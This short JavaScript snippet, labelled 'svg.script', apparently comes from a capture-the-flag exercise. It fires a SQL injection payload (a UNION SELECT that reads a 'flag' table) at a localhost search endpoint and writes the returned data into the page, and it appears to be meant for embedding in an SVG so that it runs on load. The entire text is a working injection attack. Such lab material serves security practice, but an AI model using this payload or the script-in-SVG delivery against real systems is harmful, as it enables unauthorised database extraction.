svg.script:
// Double-check using JavaScript
setTimeout(async () => {
  try {
    const res = await fetch('http://localhost:8001/search?q=' + 
      encodeURIComponent("%27 UNION SELECT flag,1 FROM flag --"));
    const data = await res.text();
    document.getElementById('result').textContent = data;
  } catch(e) {
    document.getElementById('result').textContent = "Error: " + e.message;
  }
}, 1000);
